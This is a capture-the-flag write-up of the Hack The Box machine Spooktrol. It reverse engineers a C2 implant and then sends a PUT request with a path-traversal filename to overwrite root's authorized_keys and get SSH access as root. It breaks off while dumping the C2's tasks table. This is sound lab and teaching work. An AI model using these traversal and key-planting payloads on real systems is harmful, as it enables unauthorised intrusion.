---
title: HTB: Spooktrol
url: https://0xdf.gitlab.io/2021/10/26/htb-spooktrol.html
date: 2021-10-26T09:00:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-spooktrol, ctf, hackthebox, nmap, api, fastapi, python, feroxbuster, reverse-engineering, wireshark, ghidra, burp, burp-proxy, upload, sqlite, uhc
---

![Spooktrol](https://0xdfimages.gitlab.io/img/spooktrol-cover.png)

spooktrol is another UHC championship box created by IppSec. It’s all about attacking a malware C2 server, which have a long history of including silly bugs in them. In this one, I’ll hijack the tasking message and have it upload a file, which, using a directory traversal bug, allows me to write to root’s authorized keys file on the container. Then, I’ll exploit the C2’s database to write a task to another agent and get a shell on that box. In Beyond Root, I’ll look at an unintended directory traversal vulnerability in the implant download.

## Box Info

| Name | [Spooktrol](https://hackthebox.com/machines/spooktrol)  [Spooktrol](https://hackthebox.com/machines/spooktrol) [Play on HackTheBox](https://hackthebox.com/machines/spooktrol) |
| --- | --- |
| Release Date | 26 Oct 2021 |
| Retire Date | 26 Oct 2021 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [ippsec ippsec](https://app.hackthebox.com/users/3769) |

## Recon

### nmap

`nmap` found three open TCP ports, two SSH (22, 2222) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.123
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-26 12:48 EDT
Nmap scan report for 10.10.11.123
Host is up (0.024s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds

oxdf@parrot$ nmap -p 22,80,2222 -sCV -oA scans/nmap-scripts 10.10.11.123
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-26 12:49 EDT
Nmap scan report for 10.10.11.123
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    uvicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Tue, 26 Oct 2021 16:53:15 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Tue, 26 Oct 2021 16:53:03 GMT
|     server: uvicorn
|     content-length: 43
|     content-type: application/json
|     Connection: close
|     {"auth":"1e9ee9a011c729293de4ca99cc7e5e7e"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Tue, 26 Oct 2021 16:53:09 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
| http-robots.txt: 1 disallowed entry 
|_/file_management/?file=implant
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.80%I=7%D=10/26%Time=61783182%P=x86_64-pc-linux-gnu%r(Get
SF:Request,BB,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Tue,\x2026\x20Oct\x20202
SF:1\x2016:53:03\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2043\r\n
SF:content-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"aut
SF:h\":\"1e9ee9a011c729293de4ca99cc7e5e7e\"}")%r(HTTPOptions,BF,"HTTP/1\.1
SF:\x20405\x20Method\x20Not\x20Allowed\r\ndate:\x20Tue,\x2026\x20Oct\x2020
SF:21\x2016:53:09\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2031\r\
SF:ncontent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"de
SF:tail\":\"Method\x20Not\x20Allowed\"}")%r(FourOhFourRequest,AD,"HTTP/1\.
SF:1\x20404\x20Not\x20Found\r\ndate:\x20Tue,\x2026\x20Oct\x202021\x2016:53
SF::15\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2022\r\ncontent-ty
SF:pe:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail\":\"No
SF:t\x20Found\"}");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.25 seconds

```

Both [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions point to Ubuntu 20.04 Focal. The fact that there’s two suggests at least one is a container.

There’s also a `robots.txt` file as well.

### Website - TCP 80

#### Site

The site is returning JSON:

![image-20211021122603349](https://0xdfimages.gitlab.io/img/image-20211021122603349.png)

`curl` shows this as well:

```

oxdf@parrot$ curl 10.10.11.123
{"auth":"10b69220e4faf7e39a9db0fea72fe574"}

```

#### Tech Stack

The HTTP response headers show it’s running uvicorn, which suggests a Python webserver.

```

HTTP/1.1 200 OK
date: Thu, 21 Oct 2021 20:25:31 GMT
server: uvicorn
content-length: 43
content-type: application/json
Connection: close

{"auth":"1d020ace084ae4b8236b9c6b4f2d96f2"}

```

Give the API nature of this, it could be FastAPI or Flask.

#### Directory Brute Force

I’ll run `feroxbuster` against the endpoint to see if I can find more. I might try another wordlist that’s more focused on parameter names since this feels like an API, but I’ll start with the default:

```

oxdf@parrot$ feroxbuster -u http://10.10.11.123
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.123
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l        1w       10c http://10.10.11.123/poll
405        1l        3w       31c http://10.10.11.123/result
200        1l        1w       31c http://10.10.11.123/robots
307        0l        0w        0c http://10.10.11.123/file_upload
[####################] - 1m     59998/59998   0s      found:4       errors:0      
[####################] - 1m     29999/29999   493/s   http://10.10.11.123
[####################] - 1m     29999/29999   497/s   http://10.10.11.123/file_upload

```

There’s some interesting stuff here.

`/poll` returns:

```

oxdf@parrot$ curl http://10.10.11.123/poll
{"task":0}

```

`/result` returned a 405 Method Not Allowed to `feroxbuster`. I’ll try with a POST, and it crashes the server:

```

oxdf@parrot$ curl -X POST http://10.10.11.123/result
Internal Server Error

```

PUT and HEAD requests also returned 405.

#### /file\_upload

The most interesting result is `/file_upload`. It returned a 307 redirect:

```

oxdf@parrot$ curl -v http://10.10.11.123/file_upload
*   Trying 10.10.11.123:80...
* TCP_NODELAY set
* Connected to 10.10.11.123 (10.10.11.123) port 80 (#0)
> GET /file_upload HTTP/1.1
> Host: 10.10.11.123
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 307 Temporary Redirect
< date: Tue, 26 Oct 2021 17:20:28 GMT
< server: uvicorn
< location: http://10.10.11.123/file_upload/
< Transfer-Encoding: chunked
< 
* Connection #0 to host 10.10.11.123 left intact

```

It’s just redirecting to `/file_upload/` (with a trailing slash). With the trailing slash, it clearly takes a PUT request:

```

oxdf@parrot$ curl http://10.10.11.123/file_upload/
{"detail":"Method Not Allowed"}
oxdf@parrot$ curl -X POST http://10.10.11.123/file_upload/
{"detail":"Method Not Allowed"}
oxdf@parrot$ curl -I http://10.10.11.123/file_upload/
HTTP/1.1 405 Method Not Allowed
date: Tue, 26 Oct 2021 17:21:11 GMT
server: uvicorn
content-length: 31
content-type: application/json
oxdf@parrot$ curl -X PUT http://10.10.11.123/file_upload/
{"detail":[{"loc":["body","file"],"msg":"field required","type":"value_error.missing"}]}

```

It’s complaining about the `file` field being missing.

I tried a bit of messing with it, but wasn’t able to get it working on my own.

#### /file\_management

The `robots.txt` file has a disallow entry for an interesting path:

```

Disallow: /file_management/?file=implant

```

Hitting `/file_management` redirects to add the trailing slash, and `/file_management/` returns an error about missing the `file` parameter:

```

oxdf@parrot$ curl http://10.10.11.123/file_management/
{"detail":[{"loc":["query","file"],"msg":"field required","type":"value_error.missing"}]}

```

Adding `?file=implant` returns binary data:

```

oxdf@parrot$ curl http://10.10.11.123/file_management/?file=implant
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

```

It’s an ELF binary:

```

oxdf@parrot$ curl -s http://10.10.11.123/file_management/?file=implant -o- | xxd | head
00000000: 7f45 4c46 0201 0103 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 9013 4000 0000 0000  ..>.......@.....
00000020: 4000 0000 0000 0000 8019 3700 0000 0000  @.........7.....
00000030: 0000 0000 4000 3800 0600 4000 2900 2800  ....@.8...@.).(.
00000040: 0100 0000 0500 0000 0000 0000 0000 0000  ................
00000050: 0000 4000 0000 0000 0000 4000 0000 0000  ..@.......@.....
00000060: 930c 2500 0000 0000 930c 2500 0000 0000  ..%.......%.....
00000070: 0000 2000 0000 0000 0100 0000 0600 0000  .. .............
00000080: f00c 2500 0000 0000 f00c 8500 0000 0000  ..%.............
00000090: f00c 8500 0000 0000 90db 0000 0000 0000  ................

```

I’ll grab a copy with `wget`:

```

oxdf@parrot$ wget -O implant http://10.10.11.123/file_management/?file=implant
--2021-10-26 13:19:09--  http://10.10.11.123/file_management/?file=implant
Connecting to 10.10.11.123:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3613632 (3.4M) [text/plain]
Saving to: ‘implant’

implant                                                             100%[===================================================================>]   3.45M  5.84MB/s    in 0.6s    

2021-10-26 13:19:10 (5.84 MB/s) - ‘implant’ saved [3613632/3613632]

```

There’s actually an unintended directory traversal bug in this method, which I’ll look at in [Beyond Root](#beyond-root---directory-traversal).

## RE - implant

### Running It

If I try to run the binary, it crashes:

```

oxdf@parrot$ ./implant 
terminate called after throwing an instance of 'nlohmann::detail::parse_error'
  what():  [json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - unexpected end of input; expected '[', '{', or a literal
Aborted

```

I’ll try again with Wireshark listening, and there are attempted DNS resolutions:

![image-20211021172750602](https://0xdfimages.gitlab.io/img/image-20211021172750602.png)

I’ll add `spooktrol.htb` to my `/etc/hosts` file, and try again:

```

oxdf@parrot$ ./implant 
{"status":0,"id":2,"arg1":"whoami","result":"","target":"12d4deffe67d2cd4ed92cdbb932624a4","task":1,"arg2":""}
null{"task":0}
No tasks...
{"task":0}
No tasks...
{"task":0}
No tasks...
{"task":0}
No tasks...
{"task":0}
No tasks...
{"task":0}
No tasks...

```

It’s printing a new message every second or two. In Wireshark, there’s some back and forth as well. It’s talking to the C2 using HTTP, to the API I observed earlier. It seems to start with a GET to `/`, and then uses the `auth` that comes back as a cookie in the next request where it sends back my hostname:

![image-20211021173319689](https://0xdfimages.gitlab.io/img/image-20211021173319689.png)

The next request to `/poll` returns the task to run `whoami`, and the result is sent back to `/result`:

![image-20211021173413833](https://0xdfimages.gitlab.io/img/image-20211021173413833.png)

### Spooky()

#### Spooky Overview

I’ll load `implant` into Ghidra and start with `main`:

```

undefined8 main(void)

{
  Spooky();
  return 0;
}

```

The `Spooky` function is quite long, and a has a lot of C++ junk in it.

At the top, it defines a bunch of variables, and then calls `decrypt_xor`:

```

  local_360 = 0;
  local_358[0] = 0;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_368 = local_358;
  local_338 = 0;
  local_348 = (undefined  [16])0x0;
  local_318 = local_308;
  beacon_interval = 5.0;
  local_2f0 = local_2e0;
  local_310 = 0;
  local_308[0] = 0;
  local_2e8 = 0;
  local_2d0 = local_2c0;
  local_2e0[0] = 0;
  local_2c8 = 0;
  local_2c0[0] = 0;
  local_2b0 = local_2a0;
  local_2a8 = 0;
  local_2a0[0] = '\0';
  local_288 = 0;
  local_290 = local_280;
  local_280[0] = local_280[0] & 0xffffffffffffff00;
                    /* try { // try from 00401ffa to 00402017 has its CatchHandler @ 00402e47 */
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::_M_replace
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_2d0,0,0,
             "auth=",5);
  decrypt_xor[abi:cxx11]((char *)&local_408);

```

`local_408` isn’t initialized before this call. Looking at the disassembly just before the call, there’s a address of a buffer called `FLAG` put into RSI:

```

        00401fff 48 8d 44        LEA        RAX=>local_408,[RSP + 0x60]
                 24 60
        00402004 48 8d 35        LEA        RSI,[FLAG]                                       = 
                 45 a1 45 00
        0040200b 48 89 c7        MOV        RDI,RAX
        0040200e 48 89 44        MOV        qword ptr [RSP + local_458],RAX
                 24 10
        00402013 e8 88 fb        CALL       decrypt_xor[abi:cxx11]                           undefined decrypt_xor[abi:cxx11]
                 ff ff
                             } // end try from 00401ffa to 00402017

```

That buffer currently holds random bytes:

![image-20211021172258805](https://0xdfimages.gitlab.io/img/image-20211021172258805.png)

There’s a bunch of stuff going on in `decrypt_xor`, but one bit jumps out at me:

![image-20211021172357435](https://0xdfimages.gitlab.io/img/image-20211021172357435.png)

It’s looping over this buffer and XORing by 0x51. I’ll copy the bytes out of Ghidra as a Python byte string, and in a Python REPL, decode what was the first flag in the UHC competition:

```

>>> flag_enc = b'\x04\x19\x12\x2a\x03\x62\x27\x62\x3f\x36\x0e\x1c\x30\x22\x25\x34\x23\x2c'
>>> ''.join([chr(x^0x51) for x in flag_enc])
'UHC{R3v3ng_Master}'

```

A bit further down, there’s a call to `gethostname`, which matches with the DNS observed earlier.

There’s a function, `PrepareHTTP`:

![image-20211021173543810](https://0xdfimages.gitlab.io/img/image-20211021173543810.png)

It’s interesting that Ghidra is able to recognize that `local_368` should be a `State` structure. It does define that `struct`:

![image-20211021173649525](https://0xdfimages.gitlab.io/img/image-20211021173649525.png)

![image-20211021173708065](https://0xdfimages.gitlab.io/img/image-20211021173708065.png)

If I need to, I can define the fields of this struct and then apply it to this variable. I suspect all the initialized variables at the top are a part of this.

#### Using curl

`PrepareHTTP` is just setting up `curl`:

![image-20211021173819862](https://0xdfimages.gitlab.io/img/image-20211021173819862.png)

Just after that comes `PerformGET`, which sets more options, and then does the request:

![image-20211021204557344](https://0xdfimages.gitlab.io/img/image-20211021204557344.png)

About half way down, after another `PerformGET`, there’s a switch statement:

![image-20211021205018909](https://0xdfimages.gitlab.io/img/image-20211021205018909.png)

The variable I’ve named `task_id` is set to 0, and then set by `from_json`. Then it switches. If it’s 0, it prints “No tasks…”. This is being set by the `PerformGET` call above. I saw an example of a taskid of 1, where it ran `whoami`.

Throughout these tasks there’s a lot of junk related to `nlohmann`. This is a [C++ JSON library](https://github.com/nlohmann/json), and it looks like it’s involved with reading the config.

#### Task 1

There’s a ton of C++ mess in the disassembly, but I can remove a lot of it and get a pretty good idea what’s going on:

```

    case 1:
...[snip]...
        task_json = nlohmann::
                    basic_json<std::map,std::vector,std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>,bool,long,unsigned_long,double,std::allocator,nlohmann::adl_serializer,std::vector<unsigned_char,std::allocator<unsigned_char>>>
                    ::operator[]<char_const>(local_428,"arg1");
...[snip]...
        exec[abi:cxx11]((char *)&local_388);
...[snip]...
        PerformPOST((State *)&State,(basic_string *)&local_268,(basic_string *)&local_388);
...[snip]...

```

It’s getting “arg1” from the JSON, and then calling `exec`, and then later `PerformPOST`. Given that above I observed it POSTing the results of `whoami` back to the C2, this all fits.

#### Task 2

I’ll do the same thing with the case where the task id is 2:

```

    case 2:
...[snip]...
        task_json = nlohmann::
                    basic_json<std::map,std::vector,std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>,bool,long,unsigned_long,double,std::allocator,nlohmann::adl_serializer,std::vector<unsigned_char,std::allocator<unsigned_char>>>
                    ::operator[]<char_const>(local_428,"arg1");
...[snip]...
        PerformGET((State *)&State,bVar13,bVar8,(basic_string *)local_3e8,(basic_string *)&local_3c8
                  );
...[snip]...
        task_json = nlohmann::
                    basic_json<std::map,std::vector,std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>,bool,long,unsigned_long,double,std::allocator,nlohmann::adl_serializer,std::vector<unsigned_char,std::allocator<unsigned_char>>>
                    ::operator[]<char_const>(local_428,"arg2");
...[snip]...
        std::basic_ofstream<char,std::char_traits<char>>::basic_ofstream
                  ((basic_ofstream<char,std::char_traits<char>> *)&local_268,
                   (basic_string *)&local_388,0x30);
...[snip]...

```

This time it is issuing a GET request to “arg1”, and then opening a stream with “arg2”. This looks like a download capability.

#### Task 3

This is one of the shorter paths:

```

    case 3:
...[snip]...
        task_json = nlohmann::
                    basic_json<std::map,std::vector,std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>,bool,long,unsigned_long,double,std::allocator,nlohmann::adl_serializer,std::vector<unsigned_char,std::allocator<unsigned_char>>>
                    ::operator[]<char_const>(local_428,"arg1");
...[snip]...
        PerformUPLOAD((State *)&State,bVar8);
...[snip]...

```

It’s getting “arg1” and calling `PerformUPLOAD`.

Looking at PerformUPLOAD, it is doing a ton of string actions:

![image-20211021210213619](https://0xdfimages.gitlab.io/img/image-20211021210213619.png)

Looking carefully down the site, it looks like it’s building a `curl` command in local48. That variable is passed to `system` later as `system(local_48);` at 0x410e57.

#### Task 4

Task 4 took me the longest to figure out:

```

    case 4:
      task_json = nlohmann::
...[snip]...
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::_M_replace
                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_388,
                 local_380,0,"Domain: %s\n",(ulong)(local_318 + -0x5e089f));
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::_M_replace
                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_388,
                 local_380,0,"Auth: %s\n",(ulong)(local_2d0 + -0x5e08ab));
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::_M_replace
                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_388,
                 local_380,0,"Hostname: %s\n",(ulong)(local_2b0 + -0x5e08b5));
...[snip]... std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::_M_append
                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_388,
                 "CbPeriod: %i\n",uVar15);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::_M_replace
                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&local_388,
                 local_380,0,"Flag: %s\n",(ulong)((long)local_290 + -0x5e08d1));
      PerformPOST((State *)&State,(basic_string *)&local_268,(basic_string *)&local_388);
...[snip]...

```

It’s basically building a string of the various configuration values, and then POSTing that back to the C2. I could get that full command string here, but I’ll get it later through dynamic analysis.

## Shell as root in Container

### See PUT Request

#### Overview

With an idea of how the malware works, I had to bat aside the initial ideas I had about exploitation. For example, I was immediately drawn to the execution via task 1, and potential command injection in task 3. But both of those would only get execution on my host, not the C2.

I need a way to run something on the C2, and task 3 was the most interesting. It looks basically like a file upload via a PUT request. I’d like to see what that looks like.

I know the C2 is sending commands to the implant every time it checks in, and it seems it only sends a task 1 on the first connection, and then only 0 the rest of the time. There’s also the issue of the auth cookie that it seems to get before asking for tasks.

I could write my own C2 server here and try to mimic what I’ve seen, but I’ll take a different approach. Because all of the comms have been via HTTP, I’ll use Burp.

#### Routing Through Burp
- Update hosts file to direct spooktrol.htb to 127.0.0.1
- Give Burp a listener that just forwards to the Spooktrol IP.
- Use `socat` to forward 80 to that listener (Alternatively I could run Burp as root, but I already had it running).

The first was simple enough. For the listener, it’s under Proxy -> Option -> Proxy Listener. I’ll Add, setting the Bind to port to 4444, and on the “Request handling” tab, put in the Spooktrol IP for “Redirect to host” and 80 as the port.

![image-20211021211926407](https://0xdfimages.gitlab.io/img/image-20211021211926407.png)

Finally, I’ll run `socat` to do the redirection:

```

oxdf@parrot$ sudo socat TCP-LISTEN:80,fork,reuseaddr TCP:127.0.0.1:4444

```

Now I’ll run `./implant`, and the requests show up in Burp:

![image-20211021212212296](https://0xdfimages.gitlab.io/img/image-20211021212212296.png)

#### Modify Task

I’ll use the “Match and Replace” options in Burp Proxy to change the incoming tasking from the C2. The first GET to `/poll` always looks like:

```

HTTP/1.1 200 OK
date: Fri, 22 Oct 2021 01:21:14 GMT
server: uvicorn
content-length: 110
content-type: application/json
Connection: close

{"status":0,"arg1":"whoami","id":2,"result":"","target":"16f55c83d2bb6c1f59aa654da817a256","task":1,"arg2":""}

```

I want to change `"task":1` –> `"task":3`, and `"arg1":"whoami"` –> `"arg1:"test.txt"`.

I’ll add that in the Options again:

![image-20211021212514150](https://0xdfimages.gitlab.io/img/image-20211021212514150.png)

With both, it looks like:

![image-20211021212553198](https://0xdfimages.gitlab.io/img/image-20211021212553198.png)

If I run `./implant`, it errors out:

```

oxdf@parrot$ ./implant 
{"status":0,"arg1":"test.txt","id":3,"result":"","target":"1da79ea0774ee5438910b2d2734e3188","task":3,"arg2":""}
curl: (26) Failed to open/read local data from file/application

```

I forgot to create `test.txt`. This time it works:

```

oxdf@parrot$ ./implant 
{"status":0,"arg1":"test.txt","id":4,"result":"","target":"17a831078f79c7c80a2dade8bd2edf50","task":3,"arg2":""}
{"message":"File upload successful /file_management/?file=test.txt"}
{"status":0,"arg1":"test.txt","id":4,"result":"","target":"17a831078f79c7c80a2dade8bd2edf50","task":3,"arg2":""}
{"message":"File upload successful /file_management/?file=test.txt"}
{"status":0,"arg1":"test.txt","id":4,"result":"","target":"17a831078f79c7c80a2dade8bd2edf50","task":3,"arg2":""}
{"message":"File upload successful /file_management/?file=test.txt"}
{"status":0,"arg1":"test.txt","id":4,"result":"","target":"17a831078f79c7c80a2dade8bd2edf50","task":3,"arg2":""}
{"message":"File upload successful /file_management/?file=test.txt"}
{"status":0,"arg1":"test.txt","id":4,"result":"","target":"17a831078f79c7c80a2dade8bd2edf50","task":3,"arg2":""}
{"message":"File upload successful /file_management/?file=test.txt"}^C

```

It’s interesting that it keeps trying to run `whoami` (which Burp continues to change to a file upload). I wonder if the C2 controller needs the `whoami` output to log the initial beacon.

In Burp, the PUT request looks like:

```

PUT /file_upload/ HTTP/1.1
Host: spooktrol.htb
User-Agent: curl/7.74.0
Accept: */*
Cookie: auth=17a831078f79c7c80a2dade8bd2edf50
Content-Length: 209
Content-Type: multipart/form-data; boundary=------------------------184989c6c833691c
Connection: close
--------------------------184989c6c833691c
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

this is some test data
--------------------------184989c6c833691c--

```

### Arbitrary File Upload

#### Repeater

It seems like there’s a new cookie each time, so sending this request to repeater might not work. But it’s worth a try, and it does:

![image-20211021212902740](https://0xdfimages.gitlab.io/img/image-20211021212902740.png)

#### Path Traversal

With it working in repeater, I can try to upload outside the current directory:

```

PUT /file_upload/ HTTP/1.1
Host: spooktrol.htb
User-Agent: curl/7.74.0
Accept: */*
Cookie: auth=17a831078f79c7c80a2dade8bd2edf50
Content-Length: 218
Content-Type: multipart/form-data; boundary=------------------------184989c6c833691c
Connection: close
--------------------------184989c6c833691c
Content-Disposition: form-data; name="file"; filename="../../../../../../test.txt"
Content-Type: text/plain

this is some test data
--------------------------184989c6c833691c--

```

It still reports success. And, given that it’s likely writing in the system root at this point, it’s likely that the C2 is running as root.

If I try to write to a folder that doesn’t exist (like `../0xdf-folder`), it returns:

```

{"message":"Internal Server Error"}

```

#### SSH

It seems not uncommon for malware C2 to run as root, so I’ll try overwriting the `authorized_keys` file for root:

```

PUT /file_upload/ HTTP/1.1
Host: spooktrol.htb
User-Agent: curl/7.74.0
Accept: */*
Cookie: auth=17a831078f79c7c80a2dade8bd2edf50
Content-Length: 247
Content-Type: multipart/form-data; boundary=------------------------184989c6c833691c
Connection: close
--------------------------184989c6c833691c
Content-Disposition: form-data; name="file"; filename="../../../../../../../root/.ssh/authorized_keys"
Content-Type: text/plain

this is some test data
--------------------------184989c6c833691c--

```

Again, it reports success. I’ll try again with my public key as the body of the file.

It doesn’t allow me to SSH as root on port 22:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.11.123
Warning: Permanently added '10.10.11.123' (ECDSA) to the list of known hosts.
root@10.10.11.123's password:

```

But it does on TCP 2222:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen -p 2222 root@10.10.11.123
...[snip]...
root@spook2:~#

```

`user.txt` is in the home directory:

```

root@spook2:~# cat user.txt 
c0d5e7bd***********************

```

## Shell as root

### Enumeration

#### Container

I’m root and I just got `user.txt`, which is a good sign that I’m either in a container or the root flag is in one. When neither `ip` nor `ifconfig` is on the host, that’s a good sign this is the container.

`fib_trie` shows the IP 172.18.0.6:

```

root@spook2:/# cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
...[snip]...
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/29 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.6
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
...[snip]...

```

#### Spook2 DB

In `/opt`, there’s a `spook2` folder that has the C2 application:

```

root@spook2:/opt/spook2# ls
Dockerfile  app  files  server.py  sql_app.db

```

Before diving into the application, I’m interested in `sql_app.db`. It’s a SQLite DB, and I’ll open it to take a look:

```

root@spook2:/opt/spook2# file sql_app.db 
sql_app.db: SQLite 3.x database, last written using SQLite version 3031001
root@spook2:/opt/spook2# file sql_app.db 
sql_app.db: SQLite 3.x database, last written using SQLite version 3031001
root@spook2:/opt/spook2# sqlite3 sql_app.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite>

```

There are three tables:

```

sqlite> .tables
checkins  sessions  tasks

```

`checkins` is logging connections to the C2:

```

sqlite> .schema checkins 
CREATE TABLE checkins (
        id INTEGER NOT NULL, 
        session VARCHAR, 
        time DATETIME, 
        PRIMARY KEY (id)
);
CREATE INDEX ix_checkins_id ON checkins (id);

```

`sessions` is logging implants to hostnames, which is one of the first things the implant sends back:

```

sqlite> .schema sessions
CREATE TABLE sessions (
        id INTEGER NOT NULL, 
        session VARCHAR, 
        hostname VARCHAR, 
        PRIMARY KEY (id)
);
CREATE INDEX ix_sessions_hostname ON sessions (hostname);
CREATE INDEX ix_sessions_id ON sessions (id);
CREATE UNIQUE INDEX ix_sessions_session ON sessions (session);

```

`tasks` looks like it holds the tasking for the agents:

```

sqlite> .schema tasks
CREATE TABLE tasks (
        id INTEGER NOT NULL, 
        target VARCHAR, 
        status INTEGER, 
        task INTEGER, 
        arg1 VARCHAR, 
        arg2 VARCHAR, 
        result VARCHAR, 
        PRIMARY KEY (id)
);
CREATE INDEX ix_tasks_id ON tasks (id);

```

Looking at the sessions, there’s three with my hostname, and the first one from spooktrol:

```

sqlite> select * from sessions;
1|10a6dd5dde6094059db4d23d7710ae12|spooktrol
2|16f55c83d2bb6c1f59aa654da817a256|parrot
3|1da79ea0774ee5438910b2d2734e3188|parrot
4|17a831078f79c7c80a2dade8bd2edf50|parrot

```

It looks like there’s a session on the host!

I’ll look for when it last checked in:

```

sqlite> select * from checkins where session = "10a6dd5dde6094059db4d23d7710ae12";
1|10a6dd5dde6094059db4d23d7710ae12|2021-10-21 21:50:02.080706 
2|10a6dd5dde6094059db4d23d7710ae12|2021-10-21 21:52:01.511302
...[snip]...
133|10a6dd5dde6094059db4d23d7710ae12|2021-10-22 01:38:01.540701
134|10a6dd5dde6094059db4d23d7710ae12|2021-10-22 01:40:01.706032
135|10a6dd5dde6094059db4d23d7710ae12|2021-10-22 01:42:01.907263

```

It looks like every two minutes, and the last one was a minute ago.

The `tasks` table has valuable info as well:

```

sqlite> select * from tasks;
1|10a6dd5dde6094059db4d23d7710ae12|1|1|whoami||root

2|16f55c83d2bb6c1f59aa654da817a256|1|1|whoami||oxdf

3|1da79ea0774ee5438910b2d2734e3188|0|1|whoami||
4|17a831078f79c7c80a2dade8bd2edf50|0|1|whoami||

```

The first check is from the spookytrol session, which is reporting running as root. There’s a successful on from me as well, and two more that I changed with Burp so they are pending.

### Task Implant

If the implant on the host is connecting back every two minutes, I’ll create a task for it. `.dump tasks` will give the syntax:

```

sqlite> .dump tasks
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE tasks (
        id INTEGER NOT NULL, 
        target VARCHAR, 
        status INTEGER, 
        task INTEGER, 
        arg1 VARCHAR, 
        arg2 VARCHAR, 
        result VARCHAR, 
        PRIMARY KEY (id)
);
INSERT INTO tasks VALUES(1,'10a6dd5dde6094059db4d23d7710ae12',1,1,'whoami','',X'726f6f740a');
INSERT INTO tasks VALUES(2,'16f55c83d2bb6c1f59aa654da817a256',1,1,'whoami','',X'6f7864660a');
INSERT INTO tasks VALUES(3,'1da79ea0774ee5438910b2d2734e3188',0,1,'whoami','','');
